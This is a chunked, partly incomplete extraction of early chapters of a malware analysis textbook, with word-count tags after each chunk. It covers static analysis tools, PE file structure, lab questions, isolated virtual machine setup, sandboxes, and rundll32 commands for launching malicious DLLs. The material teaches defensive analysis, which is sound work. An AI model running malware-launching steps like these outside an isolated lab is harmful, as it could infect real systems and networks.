need to respond to a network intrusion. Your goals will typically be to deter-
mine exactly what happened, and to ensure that you’ve located all infected 
machines and files. When analyzing suspected malware, your goal will typi-
cally be to determine exactly what a particular suspect binary can do, how to 
detect it on your network, and how to measure and contain its damage.
[Word Count: 76]

Most often, when performing malware analysis, you’ll have only the malware 
executable, which won’t be human-readable. In order to make sense of it, 
you’ll use a variety of tools and tricks, each revealing a small amount of infor-
mation. You’ll need to use a variety of tools in order to see the full picture. 
There are two fundamental approaches to malware analysis: static and 
dynamic. Static analysis involves examining the malware without running it. 
Dynamic analysis involves running the malware. Both techniques are further 
categorized as basic or advanced.
[Word Count: 89]

Basic static analysis consists of examining the executable file without viewing 
the actual instructions. Basic static analysis can confirm whether a file is mali-
cious, provide information about its functionality, and sometimes provide 
information that will allow you to produce simple network signatures. Basic 
static analysis is straightforward and can be quick, but it’s largely ineffective 
against sophisticated malware, and it can miss important behaviors.
[Word Count: 65]

Basic dynamic analysis techniques involve running the malware and observ-
ing its behavior on the system in order to remove the infection, produce 
effective signatures, or both. However, before you can run malware safely, 
you must set up an environment that will allow you to study the running
[Word Count: 48]

malware without risk of damage to your system or network. Like basic static 
analysis techniques, basic dynamic analysis techniques can be used by most 
people without deep programming knowledge, but they won’t be effective 
with all malware and can miss important functionality.
[Word Count: 42]

Advanced static analysis consists of reverse-engineering the malware’s internals 
by loading the executable into a disassembler and looking at the program 
instructions in order to discover what the program does. The instructions are 
executed by the CPU, so advanced static analysis tells you exactly what the pro-
gram does. However, advanced static analysis has a steeper learning curve than 
basic static analysis and requires specialized knowledge of disassembly, code 
constructs, and Windows operating system concepts, all of which you’ll learn in 
this book.
[Word Count: 83]

Advanced dynamic analysis uses a debugger to examine the internal state of a 
running malicious executable. Advanced dynamic analysis techniques pro-
vide another way to extract detailed information from an executable. These 
techniques are most useful when you’re trying to obtain information that is 
difficult to gather with the other techniques. In this book, we’ll show you 
how to use advanced dynamic analysis together with advanced static analysis 
in order to completely analyze suspected malware.
[Word Count: 75]

When performing malware analysis, you will find that you can often speed up 
your analysis by making educated guesses about what the malware is trying to 
do and then confirming those hypotheses. Of course, you’ll be able to make 
better guesses if you know the kinds of things that malware usually does. To 
that end, here are the categories that most malware falls into:
[Word Count: 64]

Backdoor
Malicious code that installs itself onto a computer to allow 
the attacker access. Backdoors usually let the attacker connect to the 
computer with little or no authentication and execute commands on the 
local system.
[Word Count: 35]

Botnet
Similar to a backdoor, in that it allows the attacker access to the 
system, but all computers infected with the same botnet receive the same 
instructions from a single command-and-control server.
[Word Count: 32]

Downloader
Malicious code that exists only to download other mali-
cious code. Downloaders are commonly installed by attackers when they 
first gain access to a system. The downloader program will download and 
install additional malicious code.
[Word Count: 36]

Information-stealing malware
Malware that collects information from a 
victim’s computer and usually sends it to the attacker. Examples include 
sniffers, password hash grabbers, and keyloggers. This malware is typically 
used to gain access to online accounts such as email or online banking.
[Word Count: 42]

Launcher
Malicious program used to launch other malicious programs. 
Usually, launchers use nontraditional techniques to launch other mali-
cious programs in order to ensure stealth or greater access to a system.
[Word Count: 31]

Rootkit
Malicious code designed to conceal the existence of other 
code. Rootkits are usually paired with other malware, such as a backdoor, 
to allow remote access to the attacker and make the code difficult for the 
victim to detect.
[Word Count: 39]

Scareware
Malware designed to frighten an infected user into buying 
something. It usually has a user interface that makes it look like an anti-
virus or other security program. It informs users that there is malicious 
code on their system and that the only way to get rid of it is to buy their 
“software,” when in reality, the software it’s selling does nothing more 
than remove the scareware.
[Word Count: 69]

Spam-sending malware
Malware that infects a user’s machine and then 
uses that machine to send spam. This malware generates income for 
attackers by allowing them to sell spam-sending services.
[Word Count: 29]

Worm or virus
Malicious code that can copy itself and infect additional 
computers.
[Word Count: 13]

B A S I C  S T A T I C  T E C H N I Q U E S
[Word Count: 21]

We begin our exploration of malware analysis with 
static analysis, which is usually the first step in studying 
malware. Static analysis describes the process of analyz-
ing the code or structure of a program to determine its 
function. The program itself is not run at this time. In 
contrast, when performing dynamic analysis, the analyst 
actually runs the program, as you’ll learn in Chapter 3.
[Word Count: 65]

This chapter discusses multiple ways to extract useful information from 
executables. In this chapter, we’ll discuss the following techniques:
[Word Count: 19]


Using antivirus tools to confirm maliciousness
[Word Count: 7]


Gleaning information from a file’s strings, functions, and headers
[Word Count: 10]

Each technique can provide different information, and the ones you use 
depend on your goals. Typically, you’ll use several techniques to gather as 
much information as possible.
[Word Count: 27]

Hashing is a common method used to uniquely identify malware. The mali-
cious software is run through a hashing program that produces a unique 
hash that identifies that malware (a sort of fingerprint). The Message-Digest 
Algorithm 5 (MD5) hash function is the one most commonly used for 
malware analysis, though the Secure Hash Algorithm 1 (SHA-1) is also 
popular.
For example, using the freely available md5deep program to calculate the 
hash of the Solitaire program that comes with Windows would generate the 
following output:
[Word Count: 84]

C:\>md5deep c:\WINDOWS\system32\sol.exe
373e7a863a1a345c60edb9e20ec32311  c:\WINDOWS\system32\sol.exe
[Word Count: 4]

The hash is 373e7a863a1a345c60edb9e20ec32311.
The GUI-based WinMD5 calculator, shown in Figure 1-1, can calculate 
and display hashes for several files at a time.
Once you have a unique hash for a piece of malware, you can use it as 
follows:
[Word Count: 40]


Share that hash with other analysts to help them to identify malware.
[Word Count: 13]


Search for that hash online to see if the file has already been identified.
[Word Count: 15]

A string in a program is a sequence of characters such as “the.” A program 
contains strings if it prints a message, connects to a URL, or copies a file to a 
specific location. 
Searching through the strings can be a simple way to get hints about 
the functionality of a program. For example, if the program accesses a URL, 
then you will see the URL accessed stored as a string in the program. You can 
use the Strings program (http://bit.ly/ic4plL), to search an executable for 
strings, which are typically stored in either ASCII or Unicode format.
[Word Count: 97]

NOTE
Microsoft uses the term wide character string to describe its implementation of Uni-
code strings, which varies slightly from the Unicode standards. Throughout this book, 
when we refer to Unicode, we are referring to the Microsoft implementation.
[Word Count: 38]

Both ASCII and Unicode formats store characters in sequences that end 
with a NULL terminator to indicate that the string is complete. ASCII strings 
use 1 byte per character, and Unicode uses 2 bytes per character.
Figure 1-2 shows the string BAD stored as ASCII. The ASCII string is stored 
as the bytes 0x42, 0x41, 0x44, and 0x00, where 0x42 is the ASCII representa-
tion of a capital letter B, 0x41 represents the letter A, and so on. The 0x00 at 
the end is the NULL terminator.
[Word Count: 87]

Figure 1-2: ASCII representation of the string BAD
[Word Count: 8]

Figure 1-3 shows the string BAD stored as Unicode. The Unicode string is 
stored as the bytes 0x42, 0x00, 0x41, and so on. A capital B is represented by 
the bytes 0x42 and 0x00, and the NULL terminator is two 0x00 bytes in a row.
[Word Count: 45]

Figure 1-3: Unicode representation of the string BAD
[Word Count: 8]

C:>strings bp6.ex_
VP3
VW3
t$@
D$4
99.124.22.1 
e-@
GetLayout 
GDI32.DLL 
SetLayout 
M}C
Mail system DLL is invalid.!Send Mail failed to send message. 
[Word Count: 27]

things: The subject malware sends messages (probably through email), and it 
depends on a mail system DLL. This information suggests that we might want 
to check email logs for suspicious traffic, and that another DLL (Mail system 
DLL) might be associated with this particular malware. Note that the missing 
DLL itself is not necessarily malicious; malware often uses legitimate libraries 
and DLLs to further its goals.
[Word Count: 66]

NOTE
Packed and obfuscated code will often include at least the functions LoadLibrary and 
GetProcAddress, which are used to load and gain access to additional functions.
[Word Count: 26]

When the packed program is run, a small wrapper program also runs to 
decompress the packed file and then run the unpacked file, as shown in Fig-
ure 1-4. When a packed program is analyzed statically, only the small wrapper 
program can be dissected. (Chapter 18 discusses packing and unpacking in 
more detail.)
[Word Count: 53]

Figure 1-4: The file on the left is the original executable, with all strings, 
imports, and other information visible. On the right is a packed execut-
able. All of the packed file’s strings, imports, and other information are 
compressed and invisible to most static analysis tools.
[Word Count: 46]

(Strings and other 
information visible)
Packed Executable
[Word Count: 7]

(Strings and other 
information not 
visible)
[Word Count: 6]

One way to detect packed files is with the PEiD program. You can use PEiD 
to detect the type of packer or compiler employed to build an application, 
which makes analyzing the packed file much easier. Figure 1-5 shows infor-
mation about the orig_af2.ex_ file as reported by PEiD.
[Word Count: 49]

NOTE
Development and support for PEiD has been discontinued since April 2011, but it’s 
still the best tool available for packer and compiler detection. In many cases, it will also 
identify which packer was used to pack the file.
[Word Count: 39]

NOTE
Many PEiD plug-ins will run the malware executable without warning! (See Chapter 2 
to learn how to set up a safe environment for running malware.) Also, like all pro-
grams, especially those used for malware analysis, PEiD can be subject to vulnerabili-
ties. For example, PEiD version 0.92 contained a buffer overflow that allowed an 
attacker to execute arbitrary code. This would have allowed a clever malware writer to 
write a program to exploit the malware analyst’s machine. Be sure to use the latest ver-
sion of PEiD.
[Word Count: 89]

So far, we have discussed tools that scan executables without regard to their 
format. However, the format of a file can reveal a lot about the program’s 
functionality.
[Word Count: 28]

Exploring Dynamically Linked Functions with Dependency Walker
[Word Count: 7]

The Dependency Walker program (http://www.dependencywalker.com/), distrib-
uted with some versions of Microsoft Visual Studio and other Microsoft devel-
opment packages, lists only dynamically linked functions in an executable.
Figure 1-6 shows the Dependency Walker’s analysis of SERVICES.EX_ . 
The far left pane at  shows the program as well as the DLLs being 
imported, namely KERNEL32.DLL and WS2_32.DLL.
[Word Count: 58]

Figure 1-6: The Dependency Walker program
[Word Count: 6]

Clicking KERNEL32.DLL shows its imported functions in the upper-right 
pane at . We see several functions, but the most interesting is CreateProcessA, 
which tells us that the program will probably create another process, and sug-
gests that when running the program, we should watch for the launch of 
additional programs.
The middle right pane at  lists all functions in KERNEL32.DLL that can 
be imported—information that is not particularly useful to us. Notice the col-
umn in panes  and  labeled Ordinal. Executables can import functions
[Word Count: 87]

Kernel32.dll
This is a very common DLL that contains core functionality, such as access 
and manipulation of memory, files, and hardware.
[Word Count: 21]

Advapi32.dll
This DLL provides access to advanced core Windows components such 
as the Service Manager and Registry.
[Word Count: 17]

User32.dll
This DLL contains all the user-interface components, such as buttons, scroll 
bars, and components for controlling and responding to user actions.
[Word Count: 22]

Gdi32.dll
This DLL contains functions for displaying and manipulating graphics.
[Word Count: 10]

Ntdll.dll
This DLL is the interface to the Windows kernel. Executables generally do 
not import this file directly, although it is always imported indirectly by 
Kernel32.dll. If an executable imports this file, it means that the author 
intended to use functionality not normally available to Windows pro-
grams. Some tasks, such as hiding functionality or manipulating pro-
cesses, will use this interface.
[Word Count: 62]

These are networking DLLs. A program that accesses either of these most 
likely connects to a network or performs network-related tasks.
[Word Count: 21]

Wininet.dll
This DLL contains higher-level networking functions that implement 
protocols such as FTP, HTTP, and NTP.
[Word Count: 16]

The PE file header also includes information about specific functions used 
by an executable. The names of these Windows functions can give you a good 
idea about what the executable does. Microsoft does an excellent job of 
documenting the Windows API through the Microsoft Developer Network 
(MSDN) library. (You’ll also find a list of functions commonly used by mal-
ware in Appendix A.)
[Word Count: 63]

Now that you understand the basics of static analysis, let’s examine some real 
malware. We’ll look at a potential keylogger and then a packed program.
[Word Count: 25]

PotentialKeylogger.exe: An Unpacked Executable
[Word Count: 4]

Table 1-2 shows an abridged list of functions imported by PotentialKeylogger.exe, 
as collected using Dependency Walker. Because we see so many imports, we 
can immediately conclude that this file is not packed.
[Word Count: 32]

Table 1-2: An Abridged List of DLLs and Functions Imported from PotentialKeylogger.exe
[Word Count: 12]

Kernel32.dll
User32.dll
User32.dll (continued)
[Word Count: 4]

CreateDirectoryW
BeginDeferWindowPos
ShowWindow
[Word Count: 3]

CreateThread
CreateDialogParamW
TrackPopupMenu
[Word Count: 3]

DeleteFileW
CreateWindowExW
TrackPopupMenuEx
[Word Count: 3]

ExitProcess
DefWindowProcW
TranslateMessage
[Word Count: 3]

FindClose
DialogBoxParamW
UnhookWindowsHookEx
[Word Count: 3]

FindFirstFileW
EndDialog
UnregisterClassW
[Word Count: 3]

FindNextFileW
GetMessageW
UnregisterHotKey
[Word Count: 3]

GetCurrentProcess
GetWindowLongW
GDI32.dll
[Word Count: 3]

GetCurrentThread
GetWindowRect
GetStockObject
[Word Count: 3]

GetModuleHandleW
InvalidateRect
SetTextColor
[Word Count: 3]

GetShortPathNameW
IsWindowEnabled
Shell32.dll
[Word Count: 3]

HeapAlloc
LoadCursorW
CommandLineToArgvW
[Word Count: 3]

IsDebuggerPresent
LoadMenuW
SHGetFolderPathW
[Word Count: 3]

MapViewOfFile
MapVirtualKeyW
ShellExecuteExW
[Word Count: 3]

OpenProcess
MapWindowPoints
ShellExecuteW
[Word Count: 3]

SetFilePointer
RegisterClassExW
Advapi32.dll
[Word Count: 3]

surmise that it has a GUI that is displayed only to a specific user, and that the 
hotkey registered with RegisterHotKey specifies the hotkey that the malicious 
user enters to see the keylogger GUI and access recorded keystrokes. We can 
further speculate from the registry function and the existence of Software\
Microsoft\Windows\CurrentVersion\Run that this program sets itself to load at 
system startup.
[Word Count: 62]

Table 1-3 shows a complete list of the functions imported by a second piece 
of unknown malware. The brevity of this list tells us that this program is 
packed or obfuscated, which is further confirmed by the fact that this program 
has no readable strings. A Windows compiler would not create a program 
that imports such a small number of functions; even a Hello, World program 
would have more.
[Word Count: 69]

The fact that this program is packed is a valuable piece of information, 
but its packed nature also prevents us from learning anything more about 
the program using basic static analysis. We’ll need to try more advanced anal-
ysis techniques such as dynamic analysis (covered in Chapter 3) or unpack-
ing (covered in Chapter 18).
[Word Count: 55]

PE file headers can provide considerably more information than just imports. 
The PE file format contains a header followed by a series of sections. The 
header contains metadata about the file itself. Following the header are the 
actual sections of the file, each of which contains useful information. As we 
progress through the book, we will continue to discuss strategies for viewing 
the information in each of these sections. The following are the most com-
mon and interesting sections in a PE file:
[Word Count: 83]

.text
The .text section contains the instructions that the CPU exe-
cutes. All other sections store data and supporting information. Gener-
ally, this is the only section that can execute, and it should be the only 
section that includes code.
[Word Count: 40]

.rdata
The .rdata section typically contains the import and export infor-
mation, which is the same information available from both Dependency
[Word Count: 21]

Table 1-3: DLLs and Functions Imported from PackedProgram.exe
[Word Count: 8]

Walker and PEview. This section can also store other read-only data used 
by the program. Sometimes a file will contain an .idata and .edata section, 
which store the import and export information (see Table 1-4).
[Word Count: 35]

.data
The .data section contains the program’s global data, which is 
accessible from anywhere in the program. Local data is not stored in 
this section, or anywhere else in the PE file. (We address this topic in 
Chapter 6.)
[Word Count: 39]

.rsrc
The .rsrc section includes the resources used by the executable 
that are not considered part of the executable, such as icons, images, 
menus, and strings. Strings can be stored either in the .rsrc section or 
in the main program, but they are often stored in the .rsrc section for 
multilanguage support.
[Word Count: 52]

Section names are often consistent across a compiler, but can vary across 
different compilers. For example, Visual Studio uses .text for executable 
code, but Borland Delphi uses CODE. Windows doesn’t care about the actual 
name since it uses other information in the PE header to determine how a 
section is used. Furthermore, the section names are sometimes obfuscated to 
make analysis more difficult. Luckily, the default names are used most of the 
time. Table 1-4 lists the most common you’ll encounter.
[Word Count: 81]

Table 1-4: Sections of a PE File for a Windows Executable
[Word Count: 11]

.rdata
Holds read-only data that is globally accessible within the program
[Word Count: 11]

.data
Stores global data accessed throughout the program
[Word Count: 8]

.idata
Sometimes present and stores the import function information; if this section is 
not present, the import function information is stored in the .rdata section
[Word Count: 25]

.edata
Sometimes present and stores the export function information; if this section is not 
present, the export function information is stored in the .rdata section
[Word Count: 25]

.pdata
Present only in 64-bit executables and stores exception-handling information
[Word Count: 10]

.rsrc
Stores resources needed by the executable
[Word Count: 7]

.reloc
Contains information for relocation of library files
[Word Count: 8]

description at  tells us when this executable was compiled, which can be very 
useful in malware analysis and incident response. For example, an old com-
pile time suggests that this is an older attack, and antivirus programs might 
contain signatures for the malware. A new compile time suggests the reverse.
[Word Count: 51]

Figure 1-7: Viewing the IMAGE_FILE_HEADER in the PEview program
[Word Count: 9]

Figure 1-8: Viewing the IMAGE_SECTION_HEADER .text section in the PEview program
[Word Count: 11]

Table 1-5 shows the sections from PotentialKeylogger.exe. As you can see, 
the .text, .rdata, and .rsrc sections each has a Virtual Size and Size of Raw 
Data value of about the same size. The .data section may seem suspicious 
because it has a much larger virtual size than raw data size, but this is normal 
for the .data section in Windows programs. But note that this information 
alone does not tell us that the program is not malicious; it simply shows that it 
is likely not packed and that the PE file header was generated by a compiler.
[Word Count: 98]

Table 1-6 shows the sections from PackedProgram.exe. The sections in this 
file have a number of anomalies: The sections named Dijfpds, .sdfuok, and 
Kijijl are unusual, and the .text, .data, and .rdata sections are suspicious. 
The .text section has a Size of Raw Data value of 0, meaning that it takes up 
no space on disk, and its Virtual Size value is A000, which means that space 
will be allocated for the .text segment. This tells us that a packer will unpack 
the executable code to the allocated .text section.
[Word Count: 90]

Table 1-5: Section Information for PotentialKeylogger.exe
[Word Count: 6]

Table 1-6: Section Information for PackedProgram.exe
[Word Count: 6]

Viewing the Resource Section with Resource Hacker
[Word Count: 7]

Now that we’re finished looking at the header for the PE file, we can look at 
some of the sections. The only section we can examine without additional 
knowledge from later chapters is the resource section. You can use the free 
Resource Hacker tool found at http://www.angusj.com/ to browse the .rsrc 
section. When you click through the items in Resource Hacker, you’ll see the 
strings, icons, and menus. The menus displayed are identical to what the pro-
gram uses. Figure 1-9 shows the Resource Hacker display for the Windows 
Calculator program, calc.exe.
[Word Count: 92]

Figure 1-9: The Resource Hacker tool display for calc.exe
[Word Count: 9]

The panel on the left shows all resources included in this executable. 
Each root folder shown in the left pane at  stores a different type of 
resource. The informative sections for malware analysis include:
[Word Count: 35]


The Icon section lists images shown when the executable is in a file listing.
[Word Count: 15]


The Menu section stores all menus that appear in various windows, such 
as the File, Edit, and View menus. This section contains the names of all 
the menus, as well as the text shown for each. The names should give you 
a good idea of their functionality.
[Word Count: 48]


The Dialog section contains the program’s dialog menus. The dialog at  
shows what the user will see when running calc.exe. If we knew nothing 
else about calc.exe, we could identify it as a calculator program simply by 
looking at this dialog menu.
[Word Count: 44]


The String Table section stores strings.
[Word Count: 7]


The Version Info section contains a version number and often the com-
pany name and a copyright statement.
[Word Count: 19]

Table 1-6: Section Information for PackedProgram.exe (continued)
[Word Count: 7]

The .rsrc section shown in Figure 1-9 is typical of Windows applications 
and can include whatever a programmer requires.
[Word Count: 19]

NOTE
Malware, and occasionally legitimate software, often store an embedded program or 
driver here and, before the program runs, they extract the embedded executable or driver. 
Resource Hacker lets you extract these files for individual analysis.
[Word Count: 36]

The PE header contains useful information for the malware analyst, and we 
will continue to examine it in subsequent chapters. Table 1-7 reviews the key 
information that can be obtained from a PE header.
[Word Count: 34]

Using a suite of relatively simple tools, we can perform static analysis on mal-
ware to gain a certain amount of insight into its function. But static analysis is 
typically only the first step, and further analysis is usually necessary. The next 
step is setting up a safe environment so you can run the malware and per-
form basic dynamic analysis, as you’ll see in the next two chapters.
[Word Count: 69]

Imports
Functions from other libraries that are used by the malware
[Word Count: 11]

Exports
Functions in the malware that are meant to be called by other programs 
or libraries
[Word Count: 16]

Time Date Stamp
Time when the program was compiled
[Word Count: 9]

Sections
Names of sections in the file and their sizes on disk and in memory
[Word Count: 15]

Subsystem
Indicates whether the program is a command-line or GUI application
[Word Count: 11]

Resources
Strings, icons, menus, and other information included in the file
[Word Count: 11]

This lab uses the files Lab01-01.exe and Lab01-01.dll. Use the tools and tech-
niques described in the chapter to gain information about the files and 
answer the questions below.
[Word Count: 29]

1.
Upload the files to http://www.VirusTotal.com/ and view the reports. Does 
either file match any existing antivirus signatures?
[Word Count: 18]

3.
Are there any indications that either of these files is packed or obfuscated? 
If so, what are these indicators?
[Word Count: 20]

4.
Do any imports hint at what this malware does? If so, which imports 
are they?
[Word Count: 16]

5.
Are there any other files or host-based indicators that you could look for 
on infected systems?
[Word Count: 17]

6.
What network-based indicators could be used to find this malware on 
infected machines?
[Word Count: 14]

7.
What would you guess is the purpose of these files?
[Word Count: 11]

1.
Upload the Lab01-02.exe file to http://www.VirusTotal.com/. Does it match 
any existing antivirus definitions?
[Word Count: 14]

2.
Are there any indications that this file is packed or obfuscated? If so, 
what are these indicators? If the file is packed, unpack it if possible.
[Word Count: 27]

3.
Do any imports hint at this program’s functionality? If so, which imports 
are they and what do they tell you?
[Word Count: 21]

4.
What host- or network-based indicators could be used to identify this 
malware on infected machines?
[Word Count: 16]

1.
Upload the Lab01-03.exe file to http://www.VirusTotal.com/. Does it match 
any existing antivirus definitions?
[Word Count: 14]

2.
Are there any indications that this file is packed or obfuscated? If so, 
what are these indicators? If the file is packed, unpack it if possible.
[Word Count: 27]

3.
Do any imports hint at this program’s functionality? If so, which imports 
are they and what do they tell you?
[Word Count: 21]

4.
What host- or network-based indicators could be used to identify this 
malware on infected machines?
[Word Count: 16]

1.
Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match 
any existing antivirus definitions?
[Word Count: 14]

2.
Are there any indications that this file is packed or obfuscated? If so, 
what are these indicators? If the file is packed, unpack it if possible.
[Word Count: 27]

4.
Do any imports hint at this program’s functionality? If so, which imports 
are they and what do they tell you?
[Word Count: 21]

5.
What host- or network-based indicators could be used to identify this 
malware on infected machines?
[Word Count: 16]

6.
This file has one resource in the resource section. Use Resource Hacker 
to examine that resource, and then use it to extract the resource. What 
can you learn from the resource?
[Word Count: 32]

M A L W A R E  A N A L Y S I S  I N  
V I R T U A L M A C H I N E S
[Word Count: 32]

Virtual machines are like a computer inside a computer, as illustrated in Fig-
ure 2-1. A guest OS is installed within the host OS on a virtual machine, and 
the OS running in the virtual machine is kept isolated from the host OS. 
Malware running on a virtual machine cannot harm the host OS. And if the 
malware damages the virtual machine, you can simply reinstall the OS in the 
virtual machine or return the virtual machine to a clean state.
[Word Count: 81]

Figure 2-1: Traditional applications run as shown in the left 
column. The guest OS is contained entirely within the virtual 
machine, and the virtual applications are contained within 
the guest OS.
[Word Count: 31]

VMware offers a popular series of desktop virtualization products that 
can be used for analyzing malware on virtual machines. VMware Player is free 
and can be used to create and run virtual machines, but it lacks some fea-
tures necessary for effective malware analysis. VMware Workstation costs a 
little under $200 and is generally the better choice for malware analysis. It
[Word Count: 61]

includes features such as snapshotting, which allows you to save the current 
state of a virtual machine, and the ability to clone or copy an existing virtual 
machine.
There are many alternatives to VMware, such as Parallels, Microsoft Vir-
tual PC, Microsoft Hyper-V, and Xen. These vary in host and guest OS sup-
port and features. This book will focus on using VMware for virtualization, 
but if you prefer another virtualization tool, you should still find this discus-
sion relevant.
[Word Count: 80]

Most malware includes network functionality. For example, a worm will per-
form network attacks against other machines in an effort to spread itself. But 
you would not want to allow a worm access to your own network, because it 
could to spread to other computers.
[Word Count: 45]

When analyzing malware, you will probably want to observe the malware’s 
network activity to help you understand the author’s intention, to create sig-
natures, or to exercise the program fully. VMware offers several networking 
options for virtual networking, as shown in Figure 2-2 and discussed in the 
following sections.
[Word Count: 49]

Figure 2-2: Virtual network configuration options for a network adapter
[Word Count: 10]

Host-only networking, a feature that creates a separate private LAN between the 
host OS and the guest OS, is commonly used for malware analysis. A host-only 
LAN is not connected to the Internet, which means that the malware is con-
tained within your virtual machine but allowed some network connectivity.
[Word Count: 50]

NOTE
When configuring your host computer, ensure that it is fully patched, as protection in 
case the malware you’re testing tries to spread. It’s a good idea to configure a restrictive 
firewall to the host from the virtual machine to help prevent the malware from spread-
ing to your host. The Microsoft firewall that comes with Windows XP Service Pack 2 
and later is well documented and provides sufficient protection. Even if patches are 
up to date, however, the malware could spread by using a zero-day exploit against the 
host OS.
[Word Count: 91]

Figure 2-3 illustrates the network configuration for host-only networking. 
When host-only networking is enabled, VMware creates a virtual network 
adapter in the host and virtual machines, and connects the two without 
touching the host’s physical network adapter. The host’s physical network 
adapter is still connected to the Internet or other external network.
[Word Count: 52]

Figure 2-3: Host-only networking in VMware
[Word Count: 6]

switch. In this case, the host machine is still connected to the external 
network, but not to the machine running the malware.
When using more than one virtual machine for analysis, you’ll find 
it useful to combine the machines as a virtual machine team. When your 
machines are joined as part of a virtual machine team, you will be able to 
manage their power and network settings together. To create a new virtual 
machine team, choose FileNewTeam.
[Word Count: 77]

One last configuration combines 
the best of all options. It requires 
multiple virtual machines linked 
by a LAN but disconnected from 
the Internet and host machine, so 
that the malware is connected to a 
network, but the network isn’t 
connected to anything important.
Figure 2-4 shows a custom 
configuration with two virtual 
machines connected to each 
other. In this configuration, one 
virtual machine is set up to ana-
lyze malware, and the second 
machine provides services. The 
two virtual machines are con-
nected to the same VMNet virtual
[Word Count: 88]

Connecting and Disconnecting Peripheral Devices
[Word Count: 5]

Peripheral devices, such as CD-ROMs and external USB storage drives, pose 
a particular problem for virtual machines. Most devices can be connected 
either to the physical machine or the virtual machine, but not both.
[Word Count: 34]

The VMware interface allows you to connect and disconnect external 
devices to virtual machines. If you connect a USB device to a machine while 
the virtual machine window is active, VMware will connect the USB device 
to the guest and not the host, which may be undesirable, considering the 
growing popularity of worms that spread via USB storage devices. To modify 
this setting, choose VMSettingsUSB Controller and uncheck the Auto-
matically connect new USB devices checkbox to prevent USB devices from 
being connected to the virtual machine.
[Word Count: 87]

1.
While analyzing malware sample 1, you get frustrated and want to try 
another sample.
[Word Count: 15]

2.
You take a snapshot of the malware analysis of sample 1.
[Word Count: 12]

Snapshot
 Taken
Launch
Malware
Malware Executing
Revert to
Snapshot
[Word Count: 9]

4.
You begin to analyze malware sample 2.
[Word Count: 8]

When you return to your virtual machine, you can access either snapshot 
at any time, as shown in Figure 2-6. The two machine states are completely 
independent, and you can save as many snapshots as you have disk space.
[Word Count: 39]

Transferring Files from a Virtual Machine
[Word Count: 6]

The Risks of Using VMware for Malware Analysis
[Word Count: 8]

Some malware can detect when it is running within a virtual machine, and 
many techniques have been published to detect just such a situation. VMware 
does not consider this a vulnerability and does not take explicit steps to avoid
[Word Count: 39]

Record/Replay: Running Your Computer in Reverse
[Word Count: 6]

Running and analyzing malware using VMware and virtual machines involves 
the following steps:
[Word Count: 13]

1.
Start with a clean snapshot with no malware running on it.
[Word Count: 12]

2.
Transfer the malware to the virtual machine.
[Word Count: 8]

3.
Conduct your analysis on the virtual machine.
[Word Count: 8]

4.
Take your notes, screenshots, and data from the virtual machine and 
transfer it to the physical machine.
[Word Count: 18]

5.
Revert the virtual machine to the clean snapshot.
[Word Count: 9]

B A S I C  D Y N A M I C  A N A L Y S I S
[Word Count: 20]

Several all-in-one software products can be used to perform basic dynamic 
analysis, and the most popular ones use sandbox technology. A sandbox is a 
security mechanism for running untrusted programs in a safe environment 
without fear of harming “real” systems. Sandboxes comprise virtualized envi-
ronments that often simulate network services in some fashion to ensure that 
the software or malware being tested will function normally.
[Word Count: 65]

Many malware sandboxes—such as Norman SandBox, GFI Sandbox, Anubis, 
Joe Sandbox, ThreatExpert, BitBlaze, and Comodo Instant Malware Analysis—
will analyze malware for free. Currently, Norman SandBox and GFI Sandbox 
(formerly CWSandbox) are the most popular among computer-security 
professionals.
These sandboxes provide easy-to-understand output and are great for 
initial triage, as long as you are willing to submit your malware to the sand-
box websites. Even though the sandboxes are automated, you might choose 
not to submit malware that contains company information to a public website.
[Word Count: 85]

NOTE
You can purchase sandbox tools for in-house use, but they are extremely expensive. 
Instead, you can discover everything that these sandboxes can find using the basic tech-
niques discussed in this chapter. Of course, if you have a lot of malware to analyze, it 
might be worth purchasing a sandbox software package that can be configured to pro-
cess malware quickly.
[Word Count: 62]

Most sandboxes work similarly, so we’ll focus on one example, GFI 
Sandbox. Figure 3-1 shows the table of contents for a PDF report generated 
by running a file through GFI Sandbox’s automated analysis. The malware 
report includes a variety of details on the malware, such as the network activ-
ity it performs, the files it creates, the results of scanning with VirusTotal, and 
so on.
[Word Count: 65]

Figure 3-1: GFI Sandbox sample results for win32XYZ.exe
[Word Count: 8]

Reports generated by GFI Sandbox vary in the number of sections they 
contain, based on what the analysis finds. The GFI Sandbox report has six 
sections in Figure 3-1, as follows:
[Word Count: 31]


The Analysis Summary section lists static analysis information and a high-
level overview of the dynamic analysis results.
[Word Count: 19]


The File Activity section lists files that are opened, created, or deleted for 
each process impacted by the malware.
[Word Count: 20]


The Created Mutexes section lists mutexes created by the malware.
[Word Count: 11]


The Registry Activity section lists changes to the registry.
[Word Count: 10]


The Network Activity section includes network activity spawned by the mal-
ware, including setting up a listening port or performing a DNS request.
[Word Count: 24]


The VirusTotal Results section lists the results of a VirusTotal scan of the 
malware.
[Word Count: 15]

Other potential drawbacks include the following:
[Word Count: 6]


Malware often detects when it is running in a virtual machine, and if a 
virtual machine is detected, the malware might stop running or behave 
differently. Not all sandboxes take this issue into account.
[Word Count: 35]


Some malware requires the presence of certain registry keys or files on the 
system that might not be found in the sandbox. These might be required 
to contain legitimate data, such as commands or encryption keys.
[Word Count: 37]


If the malware is a DLL, certain exported functions will not be invoked 
properly, because a DLL will not run as easily as an executable.
[Word Count: 26]


The sandbox environment OS may not be correct for the malware. For 
example, the malware might crash on Windows XP but run correctly in 
Windows 7.
[Word Count: 27]


A sandbox cannot tell you what the malware does. It may report basic 
functionality, but it cannot tell you that the malware is a custom Security 
Accounts Manager (SAM) hash dump utility or an encrypted keylogging 
backdoor, for example. Those are conclusions that you must draw on 
your own.
[Word Count: 50]

C:\>rundll32.exe DLLname, Export arguments
[Word Count: 4]

The Export value must be a function name or ordinal selected from the 
exported function table in the DLL. As you learned in Chapter 1, you can use 
a tool such as PEview or PE Explorer to view the Export table. For example, 
the file rip.dll has the following exports:
[Word Count: 50]

Install appears to be a likely way to launch rip.dll, so let’s launch the mal-
ware as follows:
[Word Count: 18]

Malware can also have functions that are exported by ordinal—that is, 
as an exported function with only an ordinal number, which we discussed 
in depth in Chapter 1. In this case, you can still call those functions with 
rundll32.exe using the following command, where 5 is the ordinal number 
that you want to call, prepended with the # character:
[Word Count: 59]

C:\>rundll32 ipr32x.dll,InstallService ServiceName
C:\>net start ServiceName
[Word Count: 6]

The ServiceName argument must be provided to the malware so it can be 
installed and run. The net start command is used to start a service on a Win-
dows system.
[Word Count: 31]

NOTE
When you see a ServiceMain function without a convenient exported function such as 
Install or InstallService, you may need to install the service manually. You can do 
